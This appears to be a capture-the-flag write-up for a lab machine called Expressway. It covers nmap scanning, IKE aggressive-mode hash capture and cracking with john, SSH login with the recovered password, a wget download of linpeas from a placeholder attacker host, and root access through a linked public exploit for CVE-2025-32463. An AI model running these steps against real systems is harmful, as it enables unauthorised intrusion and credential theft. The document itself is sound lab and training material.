# Box: Expressway

> Damiano Gubiani | 03/12/2025

export box ip

```bash
export IP='10.129.238.52'
```

running _nmap_ scan for open ports

# NMAP scan

command:

```bash
sudo nmap -sCV -sV -oN nmap/all -p - -min-rate 5000 -T4 $IP -vv -Pn --max-retries 1
```

output:

```text
Nmap scan report for 10.129.238.52 (10.129.238.52)
Host is up, received user-set (0.025s latency).
Scanned at 2026-02-16 13:09:37 CET for 15s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

the scan shows us that only the port 22 is open , lets enumerate the UDP port 

command:

```bash
sudo nmap -sU -sV -oN nmap/udp -min-rate 5000 -T4 $IP -vv -Pn -p 500
```

output:

```bash
Nmap scan report for 10.129.238.52 (10.129.238.52)
Host is up, received user-set (0.028s latency).
Scanned at 2026-02-16 13:24:49 CET for 113s

PORT    STATE SERVICE REASON              VERSION
500/udp open  isakmp? udp-response ttl 63
```

i started enumerating the port with ike-scan program , first thing i tried was bruteforce ID with a fake ID

command:

```bash
ike-scan -P -M -A -n fakeID $IP
```

output:

![](screen/Pasted%20image%2020260216134000.png)

we found a possible user

> ike@express.htb

lets catch the hash for the user we found and crack it with john

command:

```bash
ike-scan -M -A --pskcrack=hash.txt -n fakeID $IP
```

 after catching the hash we transform the hash.txt to something john can crack

command:

```bash
ikescan2john hash.txt > ike
```

and now we crack it

command:

```bash
john ike --wordlist=/opt/tools/wordlist/rockyou.txt
```

and we got a match

> freakingrockstarontheroad

lets try connecting with ssh with the found credentals

![](screen/Pasted%20image%2020260216134556.png)

and we got the user flag

# Enumerating

i uploaded the linpeas program on the machine to start enumerating the host

command:

```bash
# attacker
python3 -m http.server80
# victim
wget <attacker-ip>:80/linpeas.sh
```

checking the output and it seem that is vulnerable to kernel exploit

a quick search online we found a PoC to escalate out privilege to root

PoC link:

> https://github.com/kh4sh3i/CVE-2025-32463

# PivEsc

as we upload linpeas we upload the exploit.sh on the host and run thescript

and we are root

![](screen/Pasted%20image%2020260216140637.png)